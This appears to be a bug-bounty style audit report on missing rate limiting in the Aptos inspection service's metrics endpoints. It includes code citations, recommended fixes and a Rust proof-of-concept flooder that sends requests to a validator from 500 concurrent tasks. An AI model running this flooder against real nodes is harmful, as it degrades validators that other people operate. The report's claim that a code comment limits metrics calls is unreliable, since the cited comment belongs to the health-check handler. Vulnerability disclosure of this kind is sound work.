# Audit Report

## Title
Inspection Service Metrics Endpoints Lack Rate Limiting, Enabling CPU/Memory Exhaustion Attacks on Validators

## Summary
The Aptos inspection service exposes `/metrics` and `/json_metrics` endpoints without any rate limiting or concurrent request limiting. Attackers can repeatedly call these endpoints to trigger expensive metric gathering and encoding operations, causing CPU and memory exhaustion that degrades validator performance and consensus participation.

## Finding Description

The inspection service runs on validators and fullnodes, exposing several HTTP endpoints on port 9101 (default). [1](#0-0) 

Two critical endpoints handle metrics requests:
- `/metrics` - calls `handle_metrics_request()` 
- `/json_metrics` - calls `handle_json_metrics_request()` [2](#0-1) 

Both handlers invoke `get_encoded_metrics()`, which performs expensive operations on **every request** without any caching or rate limiting: [3](#0-2) 

The `get_metric_families()` function calls `aptos_metrics_core::gather()` to collect **all** metrics from the Prometheus registry and explicitly warns about metric families exceeding 2000 dimensions, indicating awareness of high cardinality costs: [4](#0-3) 

The code even includes a comment acknowledging the endpoint should only be called "every few seconds", yet enforces no such restriction: [5](#0-4) 

**Critical Missing Protection:**

Unlike the faucet service which implements concurrent request limiting with semaphores, the inspection service has **no such protection**. The server uses a basic Hyper service without any rate limiting: [6](#0-5) 

**HAproxy Configuration Gaps:**

While HAproxy provides global connection limits (500 maxconn, 300 maxconnrate), the metrics frontend has **no per-request rate limiting**, unlike other frontends that implement bandwidth limits: [7](#0-6) [8](#0-7) 

The metrics endpoints are exposed through HAproxy to external networks when `enableMetricsPort` is enabled: [9](#0-8) 

**Attack Scenario:**

1. Attacker establishes up to 500 concurrent HTTP connections (HAproxy maxconn limit) to port 9101
2. Each connection sends rapid requests to `/metrics` or `/json_metrics` using HTTP keep-alive
3. Each request spawns an async task that:
   - Calls `gather()` to collect all metrics (potentially thousands with >2000 dimensions per family)
   - Iterates through metric families for counting
   - Encodes entire metric set (potentially MB-sized responses)
4. With hundreds of concurrent requests, the Tokio runtime processes them all simultaneously (no semaphore limiting)
5. This causes:
   - **CPU exhaustion** from concurrent metric gathering/encoding operations
   - **Memory exhaustion** from multiple MB-sized metric buffers held simultaneously
   - **Validator degradation** affecting consensus participation and block processing

## Impact Explanation

**High Severity** per Aptos Bug Bounty criteria: "Validator node slowdowns" (up to $50,000).

The attack degrades validator performance through resource exhaustion:
- **Consensus Impact**: CPU contention slows consensus round processing, potentially causing validators to miss voting deadlines
- **Block Processing**: Memory pressure affects transaction execution and state commitment
- **Network Responsiveness**: Resource exhaustion impacts peer communication and state sync

While not causing total liveness failure or fund loss (Critical severity), sustained attacks materially degrade validator operations, violating the "Resource Limits" invariant that all operations must respect computational constraints.

## Likelihood Explanation

**High likelihood** - the attack is trivial to execute:
- No authentication required for metrics endpoints
- Simple HTTP flooding with standard tools (curl, wrk, ab)
- Metrics endpoints publicly exposed when `enableMetricsPort` is true
- No rate limiting or concurrent request protection
- Attack works against both validators and fullnodes

The only barriers are HAproxy's global connection limits (500 concurrent, 300/sec new connections), which are insufficient as a single attacker can saturate these limits while other legitimate services compete for the same connection budget.

## Recommendation

Implement **concurrent request limiting** following the faucet service pattern:

1. Add a semaphore to limit concurrent metrics requests:
```rust
use std::sync::Arc;
use tokio::sync::Semaphore;

pub const MAX_CONCURRENT_METRICS_REQUESTS: usize = 10;

pub struct MetricsService {
    concurrent_requests_semaphore: Arc<Semaphore>,
}

impl MetricsService {
    pub fn new() -> Self {
        Self {
            concurrent_requests_semaphore: Arc::new(Semaphore::new(
                MAX_CONCURRENT_METRICS_REQUESTS
            )),
        }
    }
}

pub async fn handle_metrics_request_protected(
    semaphore: Arc<Semaphore>
) -> (StatusCode, Body, String) {
    match semaphore.try_acquire() {
        Ok(_permit) => {
            // Permit automatically released when _permit drops
            let buffer = utils::get_encoded_metrics(TextEncoder::new());
            (StatusCode::OK, Body::from(buffer), CONTENT_TYPE_TEXT.into())
        },
        Err(_) => {
            (
                StatusCode::SERVICE_UNAVAILABLE,
                Body::from("Metrics service overloaded"),
                CONTENT_TYPE_TEXT.into()
            )
        }
    }
}
```

2. Add HAproxy rate limiting for metrics endpoints:
```
frontend validator-metrics
    mode http
    option httplog
    bind :9102
    default_backend validator-metrics
    
    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }
    
    # NEW: Rate limit to 10 requests per second per IP
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 10 }
```

3. Implement response caching with TTL (e.g., 5 seconds) to reduce `gather()` calls

## Proof of Concept

```rust
// Save as metrics_dos_poc.rs
// Compile: cargo build --release
// Run: ./target/release/metrics_dos_poc http://<validator-ip>:9101/metrics

use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::task::JoinHandle;

#[tokio::main]
async fn main() {
    let target_url = std::env::args()
        .nth(1)
        .expect("Usage: metrics_dos_poc <metrics_url>");
    
    println!("Starting DoS attack on {}", target_url);
    println!("Spawning 500 concurrent request tasks...");
    
    let client = Arc::new(reqwest::Client::new());
    let mut handles: Vec<JoinHandle<()>> = vec![];
    
    // Spawn 500 concurrent tasks (HAproxy maxconn limit)
    for task_id in 0..500 {
        let url = target_url.clone();
        let client = client.clone();
        
        let handle = tokio::spawn(async move {
            let start = Instant::now();
            let mut requests = 0;
            
            // Send requests as fast as possible for 60 seconds
            while start.elapsed() < Duration::from_secs(60) {
                match client.get(&url).send().await {
                    Ok(resp) => {
                        requests += 1;
                        if requests % 100 == 0 {
                            println!("Task {} sent {} requests, status: {}", 
                                task_id, requests, resp.status());
                        }
                    }
                    Err(e) => {
                        eprintln!("Task {} error: {}", task_id, e);
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                }
            }
            
            println!("Task {} completed {} requests in 60s", task_id, requests);
        });
        
        handles.push(handle);
    }
    
    // Wait for all tasks
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack completed. Monitor validator metrics for CPU/memory impact.");
}
```

**Expected Impact:**
- Validator CPU usage spikes to 100% across multiple cores
- Memory usage increases significantly (multiple GB) from buffered metric responses
- Consensus round latency increases, potentially causing missed proposals/votes
- Other validator services (API, state sync) experience degraded performance due to resource contention

**Verification:**
Monitor validator metrics during attack:
- `process_cpu_seconds_total` - should show sustained high CPU
- `process_resident_memory_bytes` - should show memory growth
- `aptos_consensus_duration_seconds` - should show increased latency
- `aptos_metrics{type="total_bytes"}` - tracks metric encoding volume

### Citations

**File:** config/src/config/inspection_service_config.rs (L26-36)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L75-101)
```rust
    thread::spawn(move || {
        // Create the service function that handles the endpoint requests
        let make_service = make_service_fn(move |_conn| {
            let node_config = node_config.clone();
            let aptos_data_client = aptos_data_client.clone();
            let peers_and_metadata = peers_and_metadata.clone();
            async move {
                Ok::<_, Infallible>(service_fn(move |request| {
                    serve_requests(
                        request,
                        node_config.clone(),
                        aptos_data_client.clone(),
                        peers_and_metadata.clone(),
                    )
                }))
            }
        });

        // Start and block on the server
        runtime
            .block_on(async {
                let server = Server::bind(&address).serve(make_service);
                server.await
            })
            .unwrap();
    });
}
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L137-146)
```rust
        JSON_METRICS_PATH => {
            // /json_metrics
            // Exposes JSON encoded metrics
            metrics::handle_json_metrics_request()
        },
        METRICS_PATH => {
            // /metrics
            // Exposes text encoded metrics
            metrics::handle_metrics_request()
        },
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L32-47)
```rust
pub fn get_encoded_metrics(encoder: impl Encoder) -> Vec<u8> {
    // Gather and encode the metrics
    let metric_families = get_metric_families();
    let mut encoded_buffer = vec![];
    if let Err(error) = encoder.encode(&metric_families, &mut encoded_buffer) {
        error!("Failed to encode metrics! Error: {}", error);
        return vec![];
    }

    // Update the total metric bytes counter
    NUM_METRICS
        .with_label_values(&["total_bytes"])
        .inc_by(encoded_buffer.len() as u64);

    encoded_buffer
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L50-79)
```rust
fn get_metric_families() -> Vec<MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
    let mut total: u64 = 0;
    let mut families_over_2000: u64 = 0;

    // Take metrics of metric gathering so we know possible overhead of this process
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }

    // These metrics will be reported on the next pull, rather than create a new family
    NUM_METRICS.with_label_values(&["total"]).inc_by(total);
    NUM_METRICS
        .with_label_values(&["families_over_2000"])
        .inc_by(families_over_2000);

    metric_families
}
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L16-20)
```rust
/// Handles a consensus health check request. This method returns
/// 200 if the node is currently participating in consensus.
///
/// Note: we assume that this endpoint will only be used every few seconds.
pub async fn handle_consensus_health_check(node_config: &NodeConfig) -> (StatusCode, Body, String) {
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L9-13)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L92-108)
```text
## Specify the validator metrics frontend
frontend validator-metrics
    mode http
    option httplog
    bind :9102
    default_backend validator-metrics

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the validator metrics backend
backend validator-metrics
    mode http
    server {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-validator:9101
```

**File:** terraform/helm/aptos-node/templates/haproxy.yaml (L39-43)
```yaml
  {{- if $.Values.service.validator.enableMetricsPort }}
  - name: metrics
    port: 9101
    targetPort: 9102
  {{- end }}
```
